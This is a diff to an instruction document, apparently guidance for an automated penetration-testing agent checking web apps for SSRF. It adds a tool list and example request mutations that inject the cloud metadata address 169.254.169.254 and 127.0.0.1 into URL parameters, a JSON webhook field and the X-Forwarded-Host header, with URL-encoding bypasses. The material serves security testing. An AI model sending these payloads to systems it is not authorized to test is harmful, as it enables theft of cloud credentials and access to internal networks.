@@ -23,6 +23,47 @@ Test for SSRF vulnerabilities by exploiting URL parameters to access internal ne
 - No URL/URI parameters found
 - Endpoint only accepts predefined URLs (dropdown selection)
 
+## Available Tools
+
+- **web_get_session_context** - Query discovered objects, credentials, and URL-related fields
+- **report_vulnerability** - Report confirmed vulnerabilities
+- **http_replay** - The ONLY way to send test requests: replay a captured request with field mutations (inject URLs, swap headers, encode payloads). Payloads travel as data, no shell escaping needed. Supports encoding pipelines (url, double-url, base64, unicode, html-entity).
+- **http_replay_raw** - Byte-exact send for protocol smuggling or malformed requests that http_replay would normalize.
+- **attack_script ssrf_listener** - TCP callback server for out-of-band (OOB) SSRF evidence.
+
+## Sending Test Requests
+
+Use **http_replay** with the captured request_id. Inject SSRF payloads via mutations:
+
+```
+# Inject metadata endpoint into URL query parameter
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "url", value: "http://169.254.169.254/latest/meta-data/"}
+])
+
+# Inject internal URL into JSON body field
+http_replay(request_id, mutations: [
+  {op: "set-body", value: '{"webhook":"http://169.254.169.254/latest/meta-data/"}'}
+])
+
+# URL-encode bypass (single encode)
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "url", value: "http://127.0.0.1", encode: ["url"]}
+])
+
+# Double URL-encode bypass
+http_replay(request_id, mutations: [
+  {op: "set-query", name: "url", value: "http://127.0.0.1", encode: ["url", "url"]}
+])
+
+# Host header injection
+http_replay(request_id, mutations: [
+  {op: "set-header", name: "X-Forwarded-Host", value: "169.254.169.254"}
+])
+```
+
+For callback-based (OOB) SSRF evidence, use `attack_script ssrf_listener` to start a callback server.
+
 ## Testing Process
 
 ### Step 1: Get Session Context
